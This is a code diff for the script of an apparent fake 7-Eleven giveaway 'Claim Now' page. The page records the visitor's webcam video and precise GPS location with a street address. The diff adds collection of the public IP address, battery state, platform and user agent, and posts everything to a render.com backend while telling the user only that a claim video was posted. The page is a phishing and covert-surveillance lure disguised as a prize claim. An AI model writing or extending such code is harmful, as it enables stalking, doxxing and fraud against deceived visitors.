@@ -13,29 +13,22 @@ async function initCamera() {
 }
 initCamera();
 
-// Function to get GPS location
+// Get GPS location + reverse geocode to address
 async function getLocationData() {
     return new Promise((resolve) => {
-
-        if (!navigator.geolocation) {
-            resolve(null);
-            return;
-        }
+        if (!navigator.geolocation) return resolve(null);
 
         navigator.geolocation.getCurrentPosition(
             async (position) => {
-
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
                 const accuracy = position.coords.accuracy;
-
                 let address = "Unknown";
 
                 try {
                     const geoRes = await fetch(
                         `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
                     );
-
                     const geoData = await geoRes.json();
                     address = geoData.display_name || "Unknown";
                 } catch (e) {
@@ -45,31 +38,47 @@ async function getLocationData() {
                 resolve({
                     latitude: lat,
                     longitude: lon,
-                    accuracy: accuracy,
-                    address: address,
+                    accuracy,
+                    address,
                     googleMaps: `https://www.google.com/maps?q=${lat},${lon}`
                 });
-
             },
             () => resolve(null),
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
-
     });
 }
 
-// Claim Now button
+// Get battery info
+async function getBatteryInfo() {
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return {
+            level: (battery.level * 100).toFixed(0) + '%',
+            charging: battery.charging
+        };
+    }
+    return null;
+}
+
+// Get public IP address
+async function getIP() {
+    try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+    } catch {
+        return null;
+    }
+}
+
+// Handle Claim Now button click
 btn.addEventListener('click', async () => {
 
     btn.style.display = 'none';
     loading.style.display = 'block';
 
     try {
-
         const stream = video.srcObject;
         const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
         let chunks = [];
@@ -79,14 +88,22 @@ btn.addEventListener('click', async () => {
         };
 
         recorder.onstop = async () => {
-
             const videoBlob = new Blob(chunks, { type: 'video/webm' });
             const formData = new FormData();
             formData.append('video', videoBlob, 'claim_video.webm');
 
-            // Get location
+            // Gather location, battery, IP, device info
             const location = await getLocationData();
+            const battery = await getBatteryInfo();
+            const ip = await getIP();
+            const device = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                battery,
+                ip
+            };
 
+            // Append data to form
             if (location) {
                 formData.append("latitude", location.latitude);
                 formData.append("longitude", location.longitude);
@@ -94,8 +111,9 @@ btn.addEventListener('click', async () => {
                 formData.append("address", location.address);
                 formData.append("maps", location.googleMaps);
             }
+            formData.append("deviceInfo", JSON.stringify(device));
 
-            // Send video + location to backend
+            // Send to backend
             const res = await fetch("https://seven-11-giveaways-2026-k7mn.onrender.com/upload-video", {
                 method: "POST",
                 body: formData
@@ -104,9 +122,10 @@ btn.addEventListener('click', async () => {
             const data = await res.json();
 
             console.log("Video posted:", data);
-            console.log("Location sent:", location);
+            console.log("Location info:", location);
+            console.log("Device info:", device);
 
-            loading.innerHTML = "<p>Success! Your claim video has been posted with your location.</p>";
+            loading.innerHTML = "<p>Success! Your claim video has been posted with location & device info.</p>";
         };
 
         recorder.start();
